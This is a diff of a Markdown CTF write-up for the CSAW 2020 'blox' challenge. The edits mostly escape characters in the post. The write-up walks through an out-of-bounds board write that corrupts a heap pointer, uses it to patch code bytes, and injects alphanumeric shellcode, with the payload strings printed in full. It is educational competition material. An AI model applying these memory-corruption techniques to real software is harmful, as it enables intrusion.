@@ -1,12 +1,12 @@
 ---
 title: CSAW CTF 2020 Qualifier - blox (rev/pwn)
 date: 2020-11-03
-slug: /writeups/csaw-ctf-2020-qual-blox
+slug: /writeups/csaw-ctf-2020-qual-blox/
 excerpt: This was a two-part series from the 2020 CSAW CTF Qualifier involving a small Tetris-like game.
 author: Darin Mao
 ---
 
-This was a two-part series from the 2020 CSAW CTF Qualifier involving a small Tetris-like game. <!-- end -->I mostly did the second part, though will touch on some of the first as well. I will also go through the process of developing a solution that is doable with no scripting and only a keyboard.
+This was a two-part series from the 2020 CSAW CTF Qualifier involving a small Tetris-like game. I mostly did the second part, though will touch on some of the first as well. I will also go through the process of developing a solution that is doable with no scripting and only a keyboard.
 
 Solving this challenge was a big team effort. Shoutout to Tux, dns, and ItzSomebody for the first part, and pepsipu and infuzion for the second.
 
@@ -30,7 +30,7 @@ void hw_log(int reason) {
 
 And later in the game logic,
 ```c
-if (!cheats_enabled && check_cheat_codes()) {
+if (\!cheats_enabled && check_cheat_codes()) {
     cheats_enabled = 1;
     hw_log(LOG_CHEATING);
 }
@@ -40,50 +40,50 @@ Thus, it is clear that the goal is simply to get `check_cheat_codes()` to return
 
 ```
 wdb> disas check_cheat_codes
-0x402718 <+0>:    push    rbp
-0x402719 <+1>:    mov     rbp, rsp
-0x40271c <+4>:    sub     rsp, 0x10
-0x402720 <+8>:    mov     dword [rbp-0x4], 0x0
-0x402727 <+15>:   jmp     0x402750
-0x402729 <+17>:   mov     eax, dword [rbp-0x4]
-0x40272c <+20>:   mov     edi, eax
-0x40272e <+22>:   call    0x402554 <sub_402554>
-0x402733 <+27>:   test    eax, eax
-0x402735 <+29>:   je      0x402745
-0x402737 <+31>:   mov     eax, dword [rbp-0x4]
-0x40273a <+34>:   mov     edi, eax
-0x40273c <+36>:   call    0x402637 <sub_402637>
-0x402741 <+41>:   test    eax, eax
-0x402743 <+43>:   jne     0x40274c
-0x402745 <+45>:   mov     eax, 0x0
-0x40274a <+50>:   jmp     0x40275b
-0x40274c <+52>:   add     dword [rbp-0x4], 0x1
-0x402750 <+56>:   cmp     dword [rbp-0x4], 0x3
-0x402754 <+60>:   jbe     0x402729
-0x402756 <+62>:   mov     eax, 0x1
-0x40275b <+67>:   leave
-0x40275c <+68>:   retn
+0x402718 \<+0>:    push    rbp
+0x402719 \<+1>:    mov     rbp, rsp
+0x40271c \<+4>:    sub     rsp, 0x10
+0x402720 \<+8>:    mov     dword [rbp-0x4], 0x0
+0x402727 \<+15>:   jmp     0x402750
+0x402729 \<+17>:   mov     eax, dword [rbp-0x4]
+0x40272c \<+20>:   mov     edi, eax
+0x40272e \<+22>:   call    0x402554 \<sub_402554>
+0x402733 \<+27>:   test    eax, eax
+0x402735 \<+29>:   je      0x402745
+0x402737 \<+31>:   mov     eax, dword [rbp-0x4]
+0x40273a \<+34>:   mov     edi, eax
+0x40273c \<+36>:   call    0x402637 \<sub_402637>
+0x402741 \<+41>:   test    eax, eax
+0x402743 \<+43>:   jne     0x40274c
+0x402745 \<+45>:   mov     eax, 0x0
+0x40274a \<+50>:   jmp     0x40275b
+0x40274c \<+52>:   add     dword [rbp-0x4], 0x1
+0x402750 \<+56>:   cmp     dword [rbp-0x4], 0x3
+0x402754 \<+60>:   jbe     0x402729
+0x402756 \<+62>:   mov     eax, 0x1
+0x40275b \<+67>:   leave
+0x40275c \<+68>:   retn
 ```
 
 So this function calls two other functions. I unfortunately did not work on disassembling these two (I was asleep, oops), but Tux and dns worked out how these work. Basically, both of them are checking the board positions to see if a cell is filled. There are several constraints to satisfy, and after some work Tux (orz) generated a valid board.
 
-![Tux orz](./tux.png)
+\![Tux orz](./tux.png)
 
 So the goal is to create this shape with tetrominoes:
 
-![Goal position for part 1](./part1goal.png)
+\![Goal position for part 1](./part1goal.png)
 
 But how to create this shape? After puzzling (pun intended) on this for a while, I decided to just try doing it by hand.
 
-![I get to play tetris _and_ do CTF?](./lmao.png)
+\![I get to play tetris _and_ do CTF?](./lmao.png)
 
 Note that since the program calls `srand(1)` at the beginning, the order of tetrominoes is always the same from program start. With this in mind, I played tetris for a few minutes.
 
-![Interesting solution](./manualsolution.png)
+\![Interesting solution](./manualsolution.png)
 
 Too bad I forgot to turn off debug mode and the keylogger. Recreating this a second time was somehow harder than doing it the first time, but I got it eventually.
 
-![Part 1 flag](./part1flag.png)
+\![Part 1 flag](./part1flag.png)
 
 Using the keylogger and their python interface, I wrote code to get to this point consistently.
 
@@ -107,7 +107,7 @@ else if (cheats_enabled) {
 
 So, once we enable cheats, we can set the current tetromino to whatever we like by pressing its letter. At first, this doesn't seem too useful. But, if we carefully rotate a piece, then swap it out for a longer one, it could clip past the bottom of the board.
 
-![O-L swap](./olswap.gif)
+\![O-L swap](./olswap.gif)
 
 This is certainly interesting behavior, but what does it do? It is important to understand, at this point, how the board is represented in memory. The board is simply a `unsigned char board[NROWS][NCOLS];`, where each element is a number corresponding to the type (and color) of the tetromino cell in that position. Throughout the code, tetrominoes are referred to with these indices.
 
@@ -161,13 +161,13 @@ unsigned char shapes[NTTR_TYPES+1][4][4][2] = {
 
 Thus, clipping a tetromino past the bottom of the board allows us to write any byte between 0x01 and 0x07 to any of the 12 bytes after the board. So what comes after the board?
 
-![Memory after the board](./memory.png)
+\![Memory after the board](./memory.png)
 
 `menu_selection` is not that interesting. `heap_top` is quite important, as it is used in the program's custom `malloc` implementation.
 
 ```c
 void* malloc(unsigned long n) {
-    if (!heap_top)
+    if (\!heap_top)
         heap_top = heap;
 
     if (heap_top+n >= (void*)&heap[sizeof(heap)]) {
@@ -185,13 +185,13 @@ This is a very simple bump allocator that does not free any old memory. The only
 ```c
 bool check_high_score() {
     unsigned int idx;
-    for (idx = 0; idx < NHIGH_SCORES; idx++)
+    for (idx = 0; idx \< NHIGH_SCORES; idx++)
         if (g_score > high_scores[idx])
             break;
     if (idx == NHIGH_SCORES)
         return 0;
 
-    writestr("  NEW HIGH SCORE!!!\n");
+    writestr("  NEW HIGH SCORE\!\!\!\n");
     char* name = malloc(4);
     writestr("Enter your name, press enter to confirm\n");
     writestr("___");
@@ -212,7 +212,7 @@ First, we note that we must get a high score every time in order for `malloc` to
 The instruction that writes the high score number is at `0x400338`, and it is 3 bytes long:
 ```
 wdb> x/i 0x400338
-0x400338 <check_high_score+432>:  mov dword ptr [rcx + rdx], eax
+0x400338 \<check_high_score+432>:  mov dword ptr [rcx + rdx], eax
 wdb> x/3bx 0x400338
 0x400338: 0x89    0x04    0x11
 ```
@@ -226,17 +226,17 @@ pop    r10
 Next, we would like to remove the restriction on what kinds of characters we are allowed to input as a high score, since overwriting only capital letters is not too useful. infuzion found that if we wrote a single `0x50` (`P`) at `0x40021e`, it would bypass nearly all of the checks.
 ```
 wdb> x/2i 0x400219
-0x400219 <check_high_score+145>:  cmp byte ptr [rbp - 9], 0x7f
-0x40021d <check_high_score+149>:  jne 0x400247
+0x400219 \<check_high_score+145>:  cmp byte ptr [rbp - 9], 0x7f
+0x40021d \<check_high_score+149>:  jne 0x400247
 wdb> set *(char*)(0x40021e) = 0x50
 0x40021e set to 0x50
 wdb> x/2i 0x400219
-0x400219 <check_high_score+145>:  cmp byte ptr [rbp - 9], 0x7f
-0x40021d <check_high_score+149>:  jne 0x40026f
+0x400219 \<check_high_score+145>:  cmp byte ptr [rbp - 9], 0x7f
+0x40021d \<check_high_score+149>:  jne 0x40026f
 ```
 
 Essentially what this does is skip past some of the checks.
-![source code explanation of P patch](./ppatch.png)
+\![source code explanation of P patch](./ppatch.png)
 
 At this point we are free to write any characters we like. Note that this means we must be careful from this point onwards, since spamming hard drop will overwrite whatever the heap points to with a bunch of spaces. infuzion suggested writing at `0x40011f`, because it was inside of `malloc`, which we could call in a controlled way (by getting a high score). I decided to write this shellcode:
 ```
@@ -247,7 +247,7 @@ c3              ret
 
 `0x400d73` is the `hw_log` function, which will take our argument in rdi and make the special syscall. Doing this gets the flag.
 
-![Running the final solution](./final.gif)
+\![Running the final solution](./final.gif)
 
 Here's the final script we used in the competition:
 ```py
@@ -317,12 +317,12 @@ jne    0x40043d
 
 The final shellcode (without the quotes, note the space):
 ```
-'TZXhRAAA6H3:AXhAAaAX5:L!APu '
+'TZXhRAAA6H3:AXhAAaAX5:L\!APu '
 ```
 
 Since the organizers decided to release the binary later, I wrote a custom wrapper (mostly implemented with `ptrace`) to patch the output strings to proper ANSI, provide the custom syscalls, and trigger LiveSplit on some checkpoints.
 
-Yes, that's right - <a href="./2020-09-20_23-39-47.mp4">speedrunning blox is now a thing</a>. Certainly some areas for improvement, but an excellent start for sure.
+Yes, that's right - \<a href="./2020-09-20_23-39-47.mp4">speedrunning blox is now a thing\</a>. Certainly some areas for improvement, but an excellent start for sure.
 
 ## Further Improvements
 Nearly a year after solving this challenge and months after writing it up, I improved the code to make it even shorter:
@@ -343,7 +343,7 @@ jne    0x40043d
 Assembled, this is only 24 bytes (four less than the original).
 
 ```
-TZXhRAAA3:hAAaAX52L!APu$
+TZXhRAAA3:hAAaAX52L\!APu$
 ```
 
 # Final Thoughts
